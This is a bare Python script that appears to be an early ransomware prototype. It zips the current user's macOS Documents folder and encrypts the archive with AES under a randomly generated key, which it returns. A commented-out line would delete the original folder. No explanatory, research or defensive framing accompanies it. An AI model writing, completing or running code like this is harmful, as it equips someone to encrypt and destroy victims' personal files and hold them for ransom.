#!/usr/bin/env python
import os
import zipfile
import shutil
import os, random, struct
from Crypto.Cipher import AES
import uuid
import getpass


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

def encryptionExecute():
	path = '/Users/'+getpass.getuser()+'/Documents'
	pathZip = path + ".zip"
	zipf = zipfile.ZipFile(pathZip, 'w', zipfile.ZIP_DEFLATED)
	zipdir(path, zipf)
	zipf.close()
	#shutil.rmtree(path)
	key = ''.join(random.choice('0123456789ABCDEF') for i in range(16));
	encrypt_file(key, pathZip)
	return key




